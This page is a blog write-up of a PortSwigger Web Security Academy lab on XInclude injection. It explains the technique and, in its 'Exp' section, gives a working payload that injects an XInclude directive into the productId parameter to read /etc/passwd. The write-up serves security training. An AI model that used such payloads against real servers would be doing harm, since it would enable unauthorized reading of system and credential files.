<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
  Lab: Exploiting XInclude to retrieve files
  #


  tags: Portswigger Web Security Academy Web
  #


Description: This lab has a &ldquo;Check stock&rdquo; feature that embeds the user input inside a server-side XML document that is subsequently parsed.
Because you don&rsquo;t control the entire XML document you can&rsquo;t define a DTD to launch a classic XXE attack.
Goal:  To solve the lab, inject an XInclude statement to retrieve the contents of the /etc/passwd file.
Hint: By default, XInclude will try to parse the included document as XML. Since /etc/passwd isn&rsquo;t valid XML, you will need to add an extra attribute to the XInclude directive to change this behavior.


  Background
  #


XInclude is a part of the XML specification that allows an XML document to be built from sub documents You can place an XInclude attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server side XML document"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xinclude-to-retrieve-files/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Lab: Exploiting `XInclude` to retrieve files"><meta property="og:description" content="Lab: Exploiting XInclude to retrieve files # tags: Portswigger Web Security Academy Web # Description: This lab has a “Check stock” feature that embeds the user input inside a server-side XML document that is subsequently parsed. Because you don’t control the entire XML document you can’t define a DTD to launch a classic XXE attack. Goal: To solve the lab, inject an XInclude statement to retrieve the contents of the /etc/passwd file. Hint: By default, XInclude will try to parse the included document as XML. Since /etc/passwd isn’t valid XML, you will need to add an extra attribute to the XInclude directive to change this behavior. Background # XInclude is a part of the XML specification that allows an XML document to be built from sub documents You can place an XInclude attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server side XML document"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="Portswigger Web Security Academy"><meta property="article:tag" content="Web"><title>Lab: Exploiting `XInclude` to retrieve files | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xinclude-to-retrieve-files/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Lab: Exploiting `XInclude` to retrieve files</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#background>Background</a></li><li><a href=#recon>Recon</a></li><li><a href=#exp>Exp</a></li><li><a href=#reference>Reference</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=lab-exploiting-xinclude-to-retrieve-files>Lab: Exploiting <code>XInclude</code> to retrieve files
<a class=anchor href=#lab-exploiting-xinclude-to-retrieve-files>#</a></h1><h6 id=tags-portswigger-web-security-academy-web>tags: <code>Portswigger Web Security Academy</code> <code>Web</code>
<a class=anchor href=#tags-portswigger-web-security-academy-web>#</a></h6><ul><li>Description: This lab has a &ldquo;Check stock&rdquo; feature that embeds the user input inside a server-side XML document that is subsequently parsed.
Because you don&rsquo;t control the entire XML document you can&rsquo;t define a DTD to launch a classic XXE attack.</li><li>Goal: To solve the lab, inject an <code>XInclude</code> statement to retrieve the contents of the /etc/passwd file.</li><li>Hint: By default, <code>XInclude</code> will try to parse the included document as XML. Since /etc/passwd isn&rsquo;t valid XML, you will need to add an extra attribute to the <code>XInclude</code> directive to change this behavior.</li></ul><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><blockquote><p>XInclude is a part of the XML specification that allows an XML document to be built from sub documents You can place an XInclude attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server side XML document</p><p>To perform an XInclude attack you need to reference the XInclude namespace and provide the path to the file that you wish to include</p><p>For example:</p><pre tabindex=0><code class=language-xml! data-lang=xml!>&lt;foo xmlns:xi=&#34;http://www.w3.org/2001/XInclude&#34;&gt;
&lt;xi:include parse=&#34;text&#34; href=&#34;file:///etc/passwd&#34;/&gt;&lt;/foo&gt;
</code></pre></blockquote><hr><p><a href=https://lonelysec.com/%E6%B7%BA%E6%9E%90xml%E4%B9%8Bxinclude-xslt/>淺析xml之xinclude & xslt</a></p><blockquote><p>xinclude可以理解為xml include熟悉編譯腳本語言的一定熟知，像php的include，python和java的import都是可以進行檔案包含的。</p></blockquote><h2 id=recon>Recon
<a class=anchor href=#recon>#</a></h2><p>In this lab, the package did not contain the xml format data so I can&rsquo;t control DTD to launch a classic XXE.
Therefore, we can use xinclude?
<img src=https://i.imgur.com/X4AUgv9.png alt></p><h2 id=exp>Exp
<a class=anchor href=#exp>#</a></h2><p>Just use the payload at background section and replace <code>productID</code>&rsquo;s data to exploited payload.
$\to$</p><pre tabindex=0><code class=language-xml! data-lang=xml!>productId=&lt;foo xmlns:xi=&#34;http://www.w3.org/2001/XInclude&#34;&gt;
&lt;xi:include parse=&#34;text&#34; href=&#34;file:///etc/passwd&#34;/&gt;&lt;/foo&gt;&amp;storeId=1
</code></pre><p>:::spoiler Success Screenshot
<img src=https://i.imgur.com/k87rQpi.png alt></p><hr><p><img src=https://i.imgur.com/J8W0JPF.png alt></p><p>:::</p><h2 id=reference>Reference
<a class=anchor href=#reference>#</a></h2></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#background>Background</a></li><li><a href=#recon>Recon</a></li><li><a href=#exp>Exp</a></li><li><a href=#reference>Reference</a></li></ul></nav></div></aside></main></body></html>